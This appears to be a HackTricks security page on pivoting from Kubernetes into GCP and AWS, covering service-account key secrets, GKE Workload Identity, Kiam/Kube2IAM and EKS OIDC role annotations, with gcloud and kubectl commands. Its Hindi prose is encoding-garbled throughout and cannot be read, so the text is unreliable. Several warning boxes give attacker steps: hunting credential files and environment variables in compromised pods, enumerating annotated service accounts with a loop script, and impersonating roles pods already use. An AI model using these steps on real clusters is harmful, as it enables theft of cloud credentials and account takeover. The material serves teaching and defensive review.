# рдХреБрдмрд░рдиреЗрдЯреАрдЬрд╝ рдХреНрд▓рд╛рдЙрдбреНрд╕ рдореЗрдВ рдкрд┐рд╡реЛрдЯрд┐рдВрдЧ

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг AWS рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг GCP рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **рдЬреБрдбрд╝реЗрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдФрд░ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВред

</details>
{% endhint %}

## GCP

рдпрджрд┐ рдЖрдк GCP рдореЗрдВ рдХреБрдмрд░рдиреЗрдЯреАрдЬрд╝ рдХреНрд▓рд╕реНрдЯрд░ рдЪрд▓рд╛ рд░рд╣реЗ рд╣реИрдВ рддреЛ рдЖрдкрдХреЛ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЪрд╛рд╣рд┐рдП рд╣реЛрдЧрд╛ рдХрд┐ рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рдЕрдВрджрд░ рдЪрд▓ рд░рд╣реЗ рдХреБрдЫ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ GCP рддрдХ рдкрд╣реБрдВрдЪ рд╣реЛред рдЗрд╕реЗ рдХрд░рдиреЗ рдХреЗ 2 рд╕рд╛рдорд╛рдиреНрдп рддрд░реАрдХреЗ рд╣реИрдВ:

### рд╕реАрдХреНрд░реЗрдЯ рдХреЗ рд░реВрдк рдореЗрдВ GCP-SA рдХреБрдВрдЬрд┐рдпрд╛рдБ рдорд╛рдЙрдВрдЯ рдХрд░рдирд╛

**рдХреБрдмрд░рдиреЗрдЯреАрдЬрд╝ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ GCP рддрдХ рдкрд╣реБрдВрдЪ рджреЗрдиреЗ** рдХрд╛ рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рддрд░реАрдХрд╛ рд╣реИ:

* рдПрдХ GCP рд╕рд░реНрд╡рд┐рд╕ рдЕрдХрд╛рдЙрдВрдЯ рдмрдирд╛рдПрдВ
* рдЙрд╕ рдкрд░ рд╡рд╛рдВрдЫрд┐рдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдмрд╛рдБрдзреЗрдВ
* рдмрдирд╛рдП рдЧрдП SA рдХреА рдЬрд╕рди рдХреБрдВрдЬреА рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ
* рдЗрд╕реЗ рдкреЙрдб рдХреЗ рдЕрдВрджрд░ рдПрдХ рд╕реАрдХреНрд░реЗрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдорд╛рдЙрдВрдЯ рдХрд░реЗрдВ
* GOOGLE\_APPLICATION\_CREDENTIALS рдкрд░ environment variable рд╕реЗрдЯ рдХрд░реЗрдВ рдЬреЛ рдЬрд╕рди рдХреА рдкрде рдкрд░ рдкреЙрдЗрдВрдЯ рдХрд░рддрд╛ рд╣реИред

{% hint style="warning" %}
рдЗрд╕рд▓рд┐рдП, рдПрдХ **рд╣рдорд▓рд╛рд╡рд░** рдХреЗ рд░реВрдк рдореЗрдВ, рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рдкреЙрдб рдХреЗ рдЕрдВрджрд░ рдХрдВрдЯреЗрдирд░ рдХреЛ рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬрд╝ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ рдЙрд╕ **env** **variable** рдФрд░ GCP рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЗ рд╕рд╛рде **json** **рдлрд╝рд╛рдЗрд▓реЗрдВ** рдХреА рдЬрд╛рдБрдЪ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдПред
{% endhint %}

### GSA json рдХреЛ KSA рд╕реАрдХреНрд░реЗрдЯ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдХрд░рдирд╛

рдПрдХ рддрд░реАрдХрд╛ рдПрдХ GSA рдХреЛ рдПрдХ GKE рдХреНрд▓рд╕реНрдЯрд░ рдХреЛ рдПрдХреНрд╕реЗрд╕ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдиреНрд╣реЗрдВ рдЗрд╕ рддрд░рд╣ рд╕реЗ рдмрд╛рдБрдзрдирд╛ рд╣реИ:

* рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдкрдиреЗ GKE рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рд╕рдорд╛рди рдиреЗрдорд╕реНрдкреЗрд╕ рдореЗрдВ рдПрдХ рдХреБрдмрд░рдиреЗрдЯреАрдЬрд╝ рд╕рд░реНрд╡рд┐рд╕ рдЕрдХрд╛рдЙрдВрдЯ рдмрдирд╛рдПрдВ:
```bash
Copy codekubectl create serviceaccount <service-account-name>
```
* рдПрдХ Kubernetes рд╕реАрдХреНрд░реЗрдЯ рдмрдирд╛рдПрдВ рдЬрд┐рд╕рдореЗрдВ рдЬреАрд╕реАрдкреА рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рдХреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рд╣реЛрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк GKE рдХреНрд▓рд╕реНрдЯрд░ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВред рдЖрдк рдЗрд╕реЗ `gcloud` рдХрдорд╛рдВрдб-рд▓рд╛рдЗрди рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕рд╛ рдХрд┐ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```bash
Copy codegcloud iam service-accounts keys create <key-file-name>.json \
--iam-account <gcp-service-account-email>
kubectl create secret generic <secret-name> \
--from-file=key.json=<key-file-name>.json
```
* рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ Kubernetes рд╕реАрдХреНрд░реЗрдЯ рдХреЛ Kubernetes рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рд╕реЗ рдЬреЛрдбрд╝реЗрдВ:
```bash
Copy codekubectl annotate serviceaccount <service-account-name> \
iam.gke.io/gcp-service-account=<gcp-service-account-email>
```
{% hint style="warning" %}
**рджреВрд╕рд░реЗ рдХрджрдо** рдореЗрдВ **GSA рдХреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ KSA рдХреЗ рд░реВрдк рдореЗрдВ рдЧреБрдкреНрдд рд░реВрдк рд╕реЗ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛**ред рдлрд┐рд░, рдЕрдЧрд░ рдЖрдк **GKE рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рдЕрдВрджрд░ рд╕реЗ рдЙрд╕ рдЧреБрдкреНрдд рд╕реАрдХреНрд░реЗрдЯ рдХреЛ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ**, рддреЛ рдЖрдк **рдЙрд╕ GCP рд╕реЗрд╡рд╛ рдЕрдХрд╛рдЙрдВрдЯ рдореЗрдВ рдЙрдиреНрдирддрд┐ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред
{% endhint %}

### GKE Workload Identity

Workload Identity рдХреЗ рд╕рд╛рде, рд╣рдо рдПрдХ [Kubernetes рд╕реЗрд╡рд╛ рдЕрдХрд╛рдЙрдВрдЯ](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/) рдХреЛ рдПрдХ [Google рд╕реЗрд╡рд╛ рдЕрдХрд╛рдЙрдВрдЯ](https://cloud.google.com/iam/docs/understanding-service-accounts) рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред Kubernetes рд╕реЗрд╡рд╛ рдЕрдХрд╛рдЙрдВрдЯ рдХреЗ рд╕рд╛рде рдЪрд▓ рд░рд╣реЗ рдкреЙрдбреНрд╕ рдЬрдм Google Cloud APIs рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдСрдереЗрдВрдЯрд┐рдХреЗрдЯ рд╣реЛрдВрдЧреЗ рддреЛ рд╡реЗ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ Google рд╕реЗрд╡рд╛ рдЕрдХрд╛рдЙрдВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдорд╛рдгрд┐рдд рд╣реЛрдВрдЧреЗред

рдЗрд╕ рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдкрд╣рд▓реА рд╢реНрд░реГрдВрдЦрд▓рд╛ рдХреЗ рдХрджрдо** рд╣реИрдВ **GCP рдореЗрдВ Workload Identity рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдирд╛** ([**рдХрджрдо**](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)) рдФрд░ рдЙрд╕ GCP SA рдмрдирд╛рдирд╛ рдЬрд┐рд╕реЗ рдЖрдк chahiye k8s рдХреЛ рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

* рдПрдХ рдирдП рдХреНрд▓рд╕реНрдЯрд░ рдкрд░ **Workload Identity рдХреЛ рд╕рдХреНрд╖рдо рдХрд░реЗрдВ**

{% code overflow="wrap" %}
```bash
gcloud container clusters update <cluster_name> \
--region=us-central1 \
--workload-pool=<project-id>.svc.id.goog
```
{% endcode %}

* **рдирдпрд╛ рдиреЛрдбрдкреВрд▓ рдмрдирд╛рдПрдВ/рдЕрдкрдбреЗрдЯ рдХрд░реЗрдВ** (рдСрдЯреЛрдкрд╛рдпрд▓рдЯ рдХреНрд▓рд╕реНрдЯрд░реНрд╕ рдХреЛ рдЗрд╕рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ) 

{% code overflow="wrap" %}
```bash
# You could update instead of create
gcloud container node-pools create <nodepoolname> --cluster=<cluser_name> --workload-metadata=GKE_METADATA --region=us-central1
```
{% endcode %}

* **GCP рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдмрдирд╛рдПрдВ рдЬрд┐рд╕реЗ рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** K8s рд╕реЗ GCP рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реЛрдВ:
```bash
# Create SA called "gsa2ksa"
gcloud iam service-accounts create gsa2ksa --project=<project-id>

# Give "roles/iam.securityReviewer" role to the SA
gcloud projects add-iam-policy-binding <project-id> \
--member "serviceAccount:gsa2ksa@<project-id>.iam.gserviceaccount.com" \
--role "roles/iam.securityReviewer"
```
{% endcode %}

* **рдХреНрд▓рд╕реНрдЯрд░** рд╕реЗ **рдХрдиреЗрдХреНрдЯ** рдХрд░реЗрдВ рдФрд░ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рд╕рд░реНрд╡рд┐рд╕ рдЕрдХрд╛рдЙрдВрдЯ** рдмрдирд╛рдПрдВ
```bash
# Get k8s creds
gcloud container clusters get-credentials <cluster_name> --region=us-central1

# Generate our testing namespace
kubectl create namespace testing

# Create the KSA
kubectl create serviceaccount ksa2gcp -n testing
```
{% endcode %}

* **GSA рдХреЛ KSA рдХреЗ рд╕рд╛рде рдЬреЛрдбрд╝реЗрдВ** 

{% code overflow="wrap" %}
```bash
# Allow the KSA to access the GSA in GCP IAM
gcloud iam service-accounts add-iam-policy-binding gsa2ksa@<project-id.iam.gserviceaccount.com \
--role roles/iam.workloadIdentityUser \
--member "serviceAccount:<project-id>.svc.id.goog[<namespace>/ksa2gcp]"

# Indicate to K8s that the SA is able to impersonate the GSA
kubectl annotate serviceaccount ksa2gcp \
--namespace testing \
iam.gke.io/gcp-service-account=gsa2ksa@security-devbox.iam.gserviceaccount.com
```
{% endcode %}

* **KSA** рдХреЗ рд╕рд╛рде рдПрдХ **рдкреЙрдб** рдЪрд▓рд╛рдПрдВ рдФрд░ **GSA** рддрдХ **рдкрд╣реБрдВрдЪ** рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:
```bash
# If using Autopilot remove the nodeSelector stuff!
echo "apiVersion: v1
kind: Pod
metadata:
name: workload-identity-test
namespace: <namespace>
spec:
containers:
- image: google/cloud-sdk:slim
name: workload-identity-test
command: ['sleep','infinity']
serviceAccountName: ksa2gcp
nodeSelector:
iam.gke.io/gke-metadata-server-enabled: 'true'" | kubectl apply -f-

# Get inside the pod
kubectl exec -it workload-identity-test \
--namespace testing \
-- /bin/bash

# Check you can access the GSA from insie the pod with
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
gcloud auth list
```
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ рдпрджрд┐ рдЖрд╡рд╢реНрдпрдХ рд╣реЛ:

{% code overflow="wrap" %}
```bash
gcloud auth activate-service-account --key-file=/var/run/secrets/google/service-account/key.json
```
{% endcode %}

{% hint style="warning" %}
рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд░реВрдк рдореЗрдВ K8s рдХреЗ рдЕрдВрджрд░ рдЖрдкрдХреЛ **`iam.gke.io/gcp-service-account` рдПрдиреЛрдЯреЗрд╢рди** рдХреЗ рд╕рд╛рде **SAs рдХреА рдЦреЛрдЬ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП** рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдЗрд╕рдХрд╛ рд╕рдВрдХреЗрдд рджреЗрддрд╛ рд╣реИ рдХрд┐ SA рдХреБрдЫ GCP рдореЗрдВ рдкрд╣реБрдВрдЪ рд╕рдХрддрд╛ рд╣реИред рдПрдХ рдФрд░ рд╡рд┐рдХрд▓реНрдк рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдХреНрд▓рд╕реНрдЯрд░ рдореЗрдВ рдкреНрд░рддреНрдпреЗрдХ KSA рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ рдФрд░ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЗрд╕рдХрд╛ рдкрд╣реБрдВрдЪ рд╣реИред\
GCP рд╕реЗ рд╣рдореЗрд╢рд╛ рдмрд╛рдЗрдВрдбрд┐рдВрдЧ рдХреЛ рдЧрдгрдирд╛ рдХрд░рдирд╛ рджрд┐рд▓рдЪрд╕реНрдк рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдЬрд╛рдирдирд╛ рд╣реИ рдХрд┐ **рдХреНрдпрд╛ рдкрд╣реБрдВрдЪ рдЖрдк K8s рдХреЗ рдЕрдВрджрд░ SAs рдХреЛ рджреЗ рд░рд╣реЗ рд╣реИрдВ**ред
{% endhint %}

рдпрд╣ рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╣реИ рдЬрд┐рд╕рд╕реЗ **рд╕рднреА рдкреЙрдб** рдкрд░рд┐рднрд╛рд╖рд╛рдПрдБ **рдЖрд╕рд╛рдиреА рд╕реЗ рд▓реВрдк рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП **рдЦреЛрдЬ** рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ рдЬреЛ **рдЙрд╕ рдПрдиреЛрдЯреЗрд╢рди** рдХреА рддрд▓рд╛рд╢ рдореЗрдВ рд╣реИ:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "gcp-service-account"
echo ""
echo ""
done
done | grep -B 1 "gcp-service-account"
```
## AWS

### Kiam рдФрд░ Kube2IAM (Pods рдХреЗ рд▓рд┐рдП IAM рднреВрдорд┐рдХрд╛) <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

IAM Roles рдХреЛ Pods рдХреЛ рджреЗрдиреЗ рдХрд╛ (рдкреБрд░рд╛рдирд╛) рдПрдХ рддрд░реАрдХрд╛ рдПрдХ [**Kiam**](https://github.com/uswitch/kiam) рдпрд╛ рдПрдХ [**Kube2IAM**](https://github.com/jtblin/kube2iam) **рд╕рд░реНрд╡рд░** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИред рдореВрд▓ рд░реВрдк рд╕реЗ, рдЖрдкрдХреЛ рдЕрдкрдиреЗ рдХреНрд▓рд╕реНрдЯрд░ рдореЗрдВ рдПрдХ **рдбреЗрдордирд╕реЗрдЯ** рдЪрд▓рд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА рдЬрд┐рд╕рдореЗрдВ рдПрдХ **рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬреНрдб IAM рднреВрдорд┐рдХрд╛** рд╣реЛрдЧреАред рдпрд╣ рдбреЗрдордирд╕реЗрдЯ рд╡рд╣ рд╣реЛрдЧрд╛ рдЬреЛ рдЙрди рдкреЛрдбреНрд╕ рдХреЛ IAM рднреВрдорд┐рдХрд╛рдУрдВ рддрдХ рдкрд╣реБрдВрдЪрд╛рдПрдЧрд╛ рдЬрд┐рдиреНрд╣реЗрдВ рдЗрд╕рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рдЖрдкрдХреЛ **рдиреЗрдорд╕реНрдкреЗрд╕ рдХреЗ рдЕрдВрджрд░ рдкрд╣реБрдВрдЪреЗ рдЬрд╛ рд╕рдХрдиреЗ рд╡рд╛рд▓реА рднреВрдорд┐рдХрд╛рдУрдВ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, рдФрд░ рдЖрдк рдЗрд╕реЗ рдиреЗрдорд╕реНрдкреЗрд╕ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рдЕрдВрджрд░ рдПрдХ рдПрдиреЛрдЯреЗрд╢рди рдХреЗ рд╕рд╛рде рдХрд░рддреЗ рд╣реИрдВ:
```yaml
kind: Namespace
metadata:
name: iam-example
annotations:
iam.amazonaws.com/permitted: ".*"
```
{% endcode %}

{% code title="Kube2iam" %}
```yaml
apiVersion: v1
kind: Namespace
metadata:
annotations:
iam.amazonaws.com/allowed-roles: |
["role-arn"]
name: default
```
{% endcode %}

рдПрдХ рдмрд╛рд░ рдиреЗрдорд╕реНрдкреЗрд╕ IAM рд░реЛрд▓реНрд╕ рдХреЗ рд╕рд╛рде рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдкреЙрдбреНрд╕ рдореЗрдВ рдЬреЛ рд░реЛрд▓ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдЙрд╕реЗ рдЖрдк **рд╣рд░ рдкреЙрдб рдкрд░ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдЙрд╕реЗ рдЗрдВрдбрд┐рдХреЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**:

{% code title="Kiam & Kube2iam" %}
```yaml
kind: Pod
metadata:
name: foo
namespace: external-id-example
annotations:
iam.amazonaws.com/role: reportingdb-reader
```
{% endcode %}

{% hint style="warning" %}
рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд░реВрдк рдореЗрдВ, рдпрджрд┐ рдЖрдк **рдкреЙрдб рдпрд╛ рдиреЗрдорд╕реНрдкреЗрд╕ рдореЗрдВ рдпрд╛ рдПрдХ рдХрд┐рдпрд╛рдо/рдХреНрдпреВрдмреЗ2рдЖрдИрдПрдо рд╕рд░реНрд╡рд░ рдЪрд▓ рд░рд╣рд╛ рд╣реИ (рдХреНрдпреВрдм-рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ)** рддреЛ рдЖрдк **рдЙрди рдЯрд┐рдкреНрдкрдгрд┐рдпреЛрдВ рдХреЛ** рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдкреЙрдбреНрд╕ рдпрд╛ рдиреЗрдорд╕реНрдкреЗрд╕реЗрд╕ рдпрд╛ рдПрдХ рдХрд┐рдпрд╛рдо/рдХреНрдпреВрдмреЗ2рдЖрдИрдПрдо рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА **рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рд░реЛрд▓** рдФрд░ рдЕрдзрд┐рдХ (рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ AWS рдЦрд╛рддреЗ рддрдХ рдкрд╣реБрдВрдЪ рд╣реИ рддреЛ рднреВрдорд┐рдХрд╛рдПрдБ рдЧрдгрдирд╛ рдХрд░реЗрдВ) рдХрд╛ **рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред
{% endhint %}

#### IAM рд░реЛрд▓ рдХреЗ рд╕рд╛рде рдкреЙрдб рдмрдирд╛рдПрдВ

{% hint style="info" %}
рдЗрдВрдбрд┐рдХреЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП IAM рд░реЛрд▓ рдХреЛ рдЙрд╕реА AWS рдЦрд╛рддреЗ рдореЗрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдЬреИрд╕реЗ рдХрд┐рдпрд╛рдо/рдХреНрдпреВрдмреЗ2рдЖрдИрдПрдо рд░реЛрд▓ рдФрд░ рдЙрд╕ рд░реЛрд▓ рдХреЛ рдЗрд╕рдХреЗ рддрдХ рдкрд╣реБрдВрдЪ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред
{% endhint %}
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
annotations:
iam.amazonaws.com/role: transaction-metadata
name: alpine
namespace: eevee
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", "sleep 100000"]' | kubectl apply -f -
```
### IAM рднреВрдорд┐рдХрд╛ рдХреЗ рд▓рд┐рдП K8s рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ рдХреЗ рд▓рд┐рдП OIDC <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

рдпрд╣ **AWS рджреНрд╡рд╛рд░рд╛ рд╕рд┐рдлрд╛рд░рд┐рд╢рд┐рдд рддрд░реАрдХрд╛** рд╣реИред

1. рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ рдЖрдкрдХреЛ [рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рд▓рд┐рдП рдПрдХ OIDC рдкреНрд░рджрд╛рддрд╛ рдмрдирд╛рдиреЗ](https://docs.aws.amazon.com/eks/latest/userguide/enable-iam-roles-for-service-accounts.html) рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред
2. рдлрд┐рд░ рдЖрдкрдХреЛ рдПрдХ IAM рднреВрдорд┐рдХрд╛ рдмрдирд╛рдиреА рд╣реЛрдЧреА рдЬрд┐рд╕рдореЗрдВ SA рдХреЛ рдЖрд╡рд╢реНрдпрдХ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реЛрдВрдЧреАред
3. [IAM рднреВрдорд┐рдХрд╛ рдФрд░ SA рдХреЗ рдмреАрдЪ рд╡рд┐рд╢реНрд╡рд╛рд╕ рд╕рдВрдмрдВрдз рдмрдирд╛рдПрдВ](https://docs.aws.amazon.com/eks/latest/userguide/associate-service-account-role.html) рдирд╛рдо (рдпрд╛ рдирд╛рдорд╕реНрдерд╛рди рдЬреЛ рднреВрдорд┐рдХрд╛ рдХреЛ рдирд╛рдорд╕реНрдерд╛рди рдХреЗ рд╕рднреА SA рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ)ред _рд╡рд┐рд╢реНрд╡рд╛рд╕ рд╕рдВрдмрдВрдз рдореБрдЦреНрдп рд░реВрдк рд╕реЗ OIDC рдкреНрд░рджрд╛рддрд╛ рдирд╛рдо, рдирд╛рдорд╕реНрдерд╛рди рдирд╛рдо рдФрд░ SA рдирд╛рдо рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдЧрд╛_ред
4. рдЕрдВрдд рдореЗрдВ, **рдПрдХ рдПрд╕рдП рдХреЗ рд╕рд╛рде рдПрдХ рдПрдиреЛрдЯреЗрд╢рди рдмрдирд╛рдПрдВ рдЬрд┐рд╕рдореЗрдВ рднреВрдорд┐рдХрд╛ рдХрд╛ ARN рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╣реЛ**, рдФрд░ рдЙрд╕ SA рдХреЗ рд╕рд╛рде рдЪрд▓ рд░рд╣реЗ рдкреЙрдбреНрд╕ рдХреЛ **рднреВрдорд┐рдХрд╛ рдХреЗ рдЯреЛрдХрди рддрдХ рдкрд╣реБрдВрдЪ рдорд┐рд▓реЗрдЧреА**ред **рдЯреЛрдХрди** рдПрдХ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ **рд▓рд┐рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ** рдФрд░ рдкрде **`AWS_WEB_IDENTITY_TOKEN_FILE`** рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ (рдбрд┐рдлрд╝реЙрд▓реНрдЯ: `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`)
```bash
# Create a service account with a role
cat >my-service-account.yaml <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
name: my-service-account
namespace: default
annotations:
eks.amazonaws.com/role-arn: arn:aws:iam::318142138553:role/EKSOIDCTesting
EOF
kubectl apply -f my-service-account.yaml

# Add a role to an existent service account
kubectl annotate serviceaccount -n $namespace $service_account eks.amazonaws.com/role-arn=arn:aws:iam::$account_id:role/my-role
```
